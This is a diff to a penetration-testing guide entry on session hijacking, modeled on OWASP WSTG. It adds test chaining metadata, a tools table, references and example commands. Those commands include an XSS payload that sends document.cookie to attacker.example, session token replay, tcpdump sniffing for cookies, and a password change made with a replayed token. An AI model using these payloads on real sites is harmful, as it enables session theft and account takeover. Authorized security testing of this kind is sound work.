@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [session, cookies, csrf, token, wstg, sess]
 tech_stack: []
 cwe_ids: [CWE-384]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-sess-02, wstg-sess-07]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-sess-02: "Confirmed hijacking is directly enabled by missing HttpOnly/Secure flags — the cookie is stealable via XSS or network sniffing with no additional attack needed (High)"
+  wstg-sess-07: "Confirmed session hijacking + no timeout enforcement = a stolen token stays valid indefinitely, giving unlimited time to exploit or monetize access (High)"
 ---
 
 # wstg-sess-09
@@ -166,6 +168,43 @@ tester.test_reauthentication({"username": "test", "password": "test"}, "/api/cha
 
 ---
 
+## Tools
+
+| Tool                | Description               | Usage                                   |
+| --------------------- | --------------------------- | ------------------------------------------ |
+| **Wireshark / tcpdump**| Traffic sniffing            | Confirm token exposure over unencrypted transport |
+| **Burp Suite**       | Proxy/Repeater               | Replay captured tokens from another context |
+| **mitmproxy**        | MITM interception            | Simulate network-level session theft     |
+| **jwt_tool**         | JWT-specific hijack testing  | Reuse/tamper JWT session tokens          |
+
+---
+
+## Example Commands/Payloads
+
+```bash
+# Capture a session, then replay it with a different User-Agent/IP context
+SESSION=$(curl -s -c - -X POST "https://{target}/login" -d "username=usera&password=passa" | grep -oP "SESSIONID=\K[^;]+")
+curl -s -b "SESSIONID=$SESSION" -H "User-Agent: Totally-Different-Client/9.0" \
+    "https://{target}/dashboard" | grep -qi "welcome" \
+    && echo "[WARN] Session accepted from unrelated User-Agent (no binding)"
+
+# XSS-based cookie exfiltration payload (use only where XSS is confirmed/authorized)
+# <script>fetch('https://attacker.example/c?'+document.cookie)</script>
+curl -s "https://{target}/search?q=<script>fetch('https://attacker.example/c?'+document.cookie)</script>"
+
+# Confirm HttpOnly is set (mitigates the above)
+curl -sI "https://{target}/" | grep -i "set-cookie" | grep -io "httponly"
+
+# Sniff for session tokens sent over plaintext HTTP
+sudo tcpdump -A -i eth0 host {target} and port 80 | grep -iE "sessionid|cookie:"
+
+# Test if sensitive action succeeds without re-authentication using a hijacked/replayed token
+curl -s -X POST "https://{target}/api/change-password" \
+    -b "SESSIONID=$SESSION" -d "new_password=pwned123"
+```
+
+---
+
 ## Remediation Guide
 
 ### Session Binding
@@ -227,6 +266,13 @@ def change_password():
 | ----------- | ----------------------- |
 | **CWE-384** | Session Fixation        |
 | **CWE-287** | Improper Authentication |
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for Session Hijacking](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking)
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
 
 ---
